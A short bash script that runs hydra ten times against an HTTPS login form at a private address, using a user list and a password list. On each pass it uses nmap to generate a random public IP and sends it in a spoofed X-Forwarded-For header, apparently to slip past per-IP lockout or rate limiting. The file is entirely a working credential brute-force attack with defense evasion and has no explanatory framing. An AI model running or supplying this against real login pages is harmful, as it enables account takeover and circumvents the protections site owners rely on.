#!/bin/bash

for i in {1..10}
do
	xff=$(nmap -n -iR 1 --exclude 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,224-255.-.-.- -sL | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*")
	hydra -V -L users10.txt  -P pass100.txt 10.1.10.140 https-form-post "/user/login:username=^USER^\&password=^PASS^:S=Account:H=X-forwarded-for: $xff" 
done
